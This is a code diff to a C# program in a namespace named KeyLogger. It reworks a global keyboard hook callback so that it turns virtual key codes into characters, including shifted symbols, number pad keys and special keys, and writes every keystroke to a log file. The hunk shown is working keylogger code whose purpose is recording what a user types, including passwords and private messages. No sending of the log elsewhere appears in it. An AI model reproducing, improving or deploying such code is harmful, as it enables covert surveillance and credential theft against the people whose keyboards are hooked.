@@ -122,53 +122,137 @@ namespace KeyLogger {
 		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
         bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
 
-		char keyChar = (char)MapVirtualKey((uint)vkCode, 2);
+		string keyChar;
 
-		if (char.IsLetter(keyChar)) {
-			if (shiftPressed ^ capsLockActive) {
-				Console.WriteLine("Need to Upper");
-				keyChar = char.ToUpper(keyChar);
-			} else {
-				Console.WriteLine("Need to Lower");
-				keyChar = char.ToLower(keyChar);
-				}
+		if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z) { // Alphabet characters
+			if (shiftPressed ^ capsLockActive) 
+			{
+				keyChar = ((char)vkCode).ToString().ToUpper();
+			} 
+			else 
+			{
+				keyChar = ((char)vkCode).ToString().ToLower();
+			}
 			logFile.Write(keyChar);
-		} else if (char.IsDigit(keyChar) || char.IsPunctuation(keyChar)) {
-			
+		} else if (vkCode >= 96 && vkCode <= 111) { // Number pad characters
+			switch(vkCode) {
+			case 96: keyChar = "0"; break;
+			case 97: keyChar = "1"; break;
+			case 98: keyChar = "2"; break;
+			case 99: keyChar = "3"; break;
+			case 100: keyChar = "4"; break;
+			case 101: keyChar = "5"; break;
+			case 102: keyChar = "6"; break;
+			case 103: keyChar = "7"; break;
+			case 104: keyChar = "8"; break;
+			case 105: keyChar = "9"; break;
+			case 106: keyChar = "*"; break;
+			case 107: keyChar = "+"; break;
+			case 108: keyChar = "|"; break;
+			case 109: keyChar = "-"; break;
+			case 110: keyChar = "."; break;
+			case 111: keyChar = "/"; break;
+			default: keyChar = ((char)vkCode).ToString(); break;
+			} 
+			logFile.Write(keyChar);	
+		} else if ( (vkCode >= 48 && vkCode <= 57) || (vkCode >= 186 && vkCode <= 192) || (vkCode >= 219 && vkCode <= 222) ) {
 			if (shiftPressed) {
-				keyChar = (char)MapVirtualKey((uint)vkCode, 2);
-				Console.WriteLine("Need to shift the keyboard to " + keyChar);
+			    switch (vkCode) {
+			    case 48: keyChar = ")"; break;
+			    case 49: keyChar = "!"; break;
+			    case 50: keyChar = "@"; break;
+			    case 51: keyChar = "#"; break;
+			    case 52: keyChar = "$"; break;
+			    case 53: keyChar = "%"; break;
+			    case 54: keyChar = "^"; break;
+			    case 55: keyChar = "&"; break;
+			    case 56: keyChar = "*"; break;
+			    case 57: keyChar = "("; break;
+			    case 186: keyChar = ":"; break;
+			    case 187: keyChar = "+"; break;
+			    case 188: keyChar = "<"; break;
+			    case 189: keyChar = "_"; break;
+			    case 190: keyChar = ">"; break;
+			    case 191: keyChar = "?"; break;
+			    case 192: keyChar = "~"; break;
+			    case 219: keyChar = "{"; break;
+			    case 220: keyChar = "|"; break;
+			    case 221: keyChar = "}"; break;
+			    case 222: keyChar = "<Double Quotes>"; break;
+				default: keyChar = ((char)vkCode).ToString(); break;
+			    }
+			} else {
+			    switch(vkCode) {
+			    case 48: keyChar = "0"; break;
+			    case 49: keyChar = "1"; break;
+			    case 50: keyChar = "2"; break;
+			    case 51: keyChar = "3"; break;
+			    case 52: keyChar = "4"; break;
+			    case 53: keyChar = "5"; break;
+			    case 54: keyChar = "6"; break;
+			    case 55: keyChar = "7"; break;
+			    case 56: keyChar = "8"; break;
+			    case 57: keyChar = "9"; break;
+			    case 186: keyChar = ";"; break;
+			    case 187: keyChar = "="; break;
+			    case 188: keyChar = ","; break;
+			    case 189: keyChar = "-"; break;
+			    case 190: keyChar = "."; break;
+			    case 191: keyChar = "/"; break;
+			    case 192: keyChar = "``"; break;
+			    case 219: keyChar = "["; break;
+			    case 220: keyChar = "\\"; break;
+			    case 221: keyChar = "]"; break;
+			    case 222: keyChar = "<Single Quote>"; break;
+				default: keyChar = ((char)vkCode).ToString(); break;
+				}	
 			}
-			Console.WriteLine("Shift not pressed though" + keyChar);
 			logFile.Write(keyChar);
-
-		} else if (vkCode == VK_RETURN) {
-			logFile.WriteLine();
-		} else if (vkCode == VK_SPACE) {
-			logFile.Write(" ");
-		} else if (vkCode == VK_TAB) {
-		 	logFile.Write("\t");
-		} else if (vkCode == VK_BACK) {
-		 	logFile.Write("<BACKSPACE>");
-		} else if (vkCode == VK_DELETE) {
-		 	logFile.Write("<DELETE>");
-		} else if (vkCode == VK_LEFT) {
-		 	logFile.Write("<LEFT>");
-		} else if (vkCode == VK_RIGHT) {
-		 	logFile.Write("<RIGHT>");
-		} else if (vkCode == VK_UP) {
-		 	logFile.Write("<UP>");
-		} else if (vkCode == VK_DOWN) {
-		 	logFile.Write("<DOWN>");
-		} else if (vkCode == VK_OEM_PERIOD) {
-		    logFile.Write(".");
-		} else {
-			if (char.IsWhiteSpace(keyChar)) {
-        		logFile.Write(keyChar);
-			} else { 
-			 logFile.Write((Keys)vkCode);
-			}
-		}
+		} else { 
+		 switch (vkCode) {
+           case (int)Keys.F1: logFile.Write("<F1>"); break;
+           case (int)Keys.F2: logFile.Write("<F2>"); break;
+           case (int)Keys.F3: logFile.Write("<F3>"); break;
+           case (int)Keys.F4: logFile.Write("<F4>"); break;
+           case (int)Keys.F5: logFile.Write("<F5>"); break;
+           case (int)Keys.F6: logFile.Write("<F6>"); break;
+           case (int)Keys.F7: logFile.Write("<F7>"); break;
+           case (int)Keys.F8: logFile.Write("<F8>"); break;
+           case (int)Keys.F9: logFile.Write("<F9>"); break;
+           case (int)Keys.F10: logFile.Write("<F10>"); break;
+           case (int)Keys.F11: logFile.Write("<F11>"); break;
+           case (int)Keys.F12: logFile.Write("<F12>"); break;
+           case (int)Keys.PrintScreen: logFile.Write("<Print Screen>"); break;
+           case (int)Keys.Scroll: logFile.Write("<Scroll Lock>"); break;
+           case (int)Keys.Pause: logFile.Write("<Pause/Break>"); break;
+           case (int)Keys.Insert: logFile.Write("<Insert>"); break;
+           case (int)Keys.Home: logFile.Write("<Home>"); break;
+           case (int)Keys.End: logFile.Write("<End>"); break;
+           case (int)Keys.PageUp: logFile.Write("<Page Up>"); break;
+           case (int)Keys.PageDown: logFile.Write("<Page Down>"); break;
+           case (int)Keys.Escape: logFile.Write("<Esc>"); break;
+           case (int)Keys.NumLock: logFile.Write("<Num Lock>"); break;
+           case (int)Keys.Capital: break;
+           case (int)Keys.Tab: logFile.Write("<Tab>"); break;
+           case (int)Keys.Back: logFile.Write("<Backspace>"); break;
+           case (int)Keys.Delete: logFile.Write("<Delete>"); break;
+           case (int)Keys.Enter: logFile.WriteLine(""); break;
+           case (int)Keys.Space: logFile.Write(" "); break;
+           case (int)Keys.Left: logFile.Write("<Left>"); break;
+           case (int)Keys.Up: logFile.Write("<Up>"); break;
+           case (int)Keys.Right: logFile.Write("<Right>"); break;
+           case (int)Keys.Down: logFile.Write("<Down>"); break;
+           case (int)Keys.LMenu:
+           case (int)Keys.RMenu: logFile.Write("<Alt>"); break;
+           case (int)Keys.LWin:
+           case (int)Keys.RWin: logFile.Write("<Windows Key>"); break;
+           case (int)Keys.LShiftKey:
+           case (int)Keys.RShiftKey: break;
+           case (int)Keys.LControlKey:
+           case (int)Keys.RControlKey: logFile.Write("<Ctrl>"); break;
+           default: logFile.Write("<KEY_" + vkCode + ">"); break;
+                    }
+			}	
       }
 
       return CallNextHookEx(hookId, nCode, wParam, lParam);
